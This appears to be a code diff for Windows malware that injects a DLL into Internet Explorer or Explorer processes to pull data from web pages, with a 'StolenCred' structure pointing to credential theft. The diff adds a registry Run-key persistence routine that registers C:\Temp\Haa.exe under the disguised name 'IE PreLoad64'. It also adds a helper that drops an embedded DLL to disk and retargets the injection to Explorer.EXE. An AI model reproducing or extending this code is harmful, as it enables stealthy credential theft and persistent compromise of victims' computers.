@@ -11,6 +11,8 @@ HWND GetProcessWindow(wchar_t* ProcessName);
 HWND FindWindowFromProcess(HANDLE hProcess);
 void OnGetDocInterface(HWND hWnd, LPVOID Data);
 void ReadCollection(IHTMLElementCollection* pColl, LPVOID Data);
+void MakeAutoRun();
+
 
 struct EnumData {
 	DWORD dwProcessId;
@@ -28,7 +30,8 @@ struct StolenCred{
 int _tmain(int argc, _TCHAR* argv[])
 {
 #if _WIN64
-	wchar_t* appName = L"iexplore.exe";
+	//wchar_t* appName = L"notepad.exe";
+	wchar_t* appName = L"Explorer.EXE";
 #else
 	wchar_t* appName = L"IEXPLORE.EXE";
 #endif
@@ -36,6 +39,8 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	wchar_t* windowName = L"IEFRAME";
 
+	//extractResource(GetModuleHandle(, 101, L"Hd.dll");
+	MakeAutoRun();
 	InjectProcess(appName);
 	//Sleep(3000);
 	//HWND foreground = GetForegroundWindow();
@@ -56,14 +61,65 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	OnGetDocInterface(IETabWindow, &Data);*/
 
-	getchar();
+	//getchar();
 
 	return 0;
 }
 
+void MakeAutoRun()
+{
+
+	HKEY hkey;
+	long regOpenResult;
+	wchar_t * path = L"C:\\Temp\\Haa.exe";
+	wchar_t * regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+	regOpenResult = RegOpenKeyEx(HKEY_CURRENT_USER, regPath, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
+	LPCWSTR note = L"IE PreLoad64";
+	DWORD s = wcslen(path);
+	RegSetKeyValue(HKEY_CURRENT_USER, regPath, note, REG_SZ, (BYTE*)path, (wcslen(path) + 1) * 2);
+	RegCloseKey(hkey);
+
+}
+
+bool extractResource(const HINSTANCE hInstance, WORD resourceID, LPCTSTR szFilename)
+{
+	bool bSuccess = false;
+	try
+	{
+		// Find and load the resource
+		HRSRC hResource = FindResource(hInstance, MAKEINTRESOURCE(resourceID), L"DLL");
+		HGLOBAL hFileResource = LoadResource(hInstance, hResource);
+
+		// Open and map this to a disk file
+		LPVOID lpFile = LockResource(hFileResource);
+		DWORD dwSize = SizeofResource(hInstance, hResource);
+
+		// Open the file and filemap
+		HANDLE hFile = CreateFile(szFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		HANDLE hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwSize, NULL);
+		LPVOID lpAddress = MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, 0);
+
+		// Write the file
+		CopyMemory(lpAddress, lpFile, dwSize);
+
+		// Un-map the file and close the handles
+		UnmapViewOfFile(lpAddress);
+		CloseHandle(hFileMap);
+		CloseHandle(hFile);
+		bSuccess = true;
+	}
+	catch (...)
+	{
+		// Whatever
+	}
+	return bSuccess;
+}
+
 void InjectProcess(wchar_t* AppName)
 {
-	char* buffer = "C:\\Source\\GitHub\\Haa\\Debug\\HaaDLL32.dll";
+	char* buffer = "C:\\Temp\\HaaDLL.dll";
+
+	//CString currentPath = 
 
 	DWORD procID = 0;
 	procID = GetLowestProcessIDByName(AppName);
@@ -186,7 +242,10 @@ DWORD GetLowestProcessIDByName(wchar_t* ProcessName)
 			}
 			CloseHandle(hProcess);
 
-			if (sizeof(szProcessName) > 0 && wcscmp(szProcessName, ProcessName) == 0)
+			CString currProcess = szProcessName;
+			CString fndProcess = ProcessName;
+
+			if (sizeof(szProcessName) > 0 && wcscmp(currProcess.MakeLower(), fndProcess.MakeLower()) == 0)
 			{
 				CurrentPID = aProcesses[i];
 			}
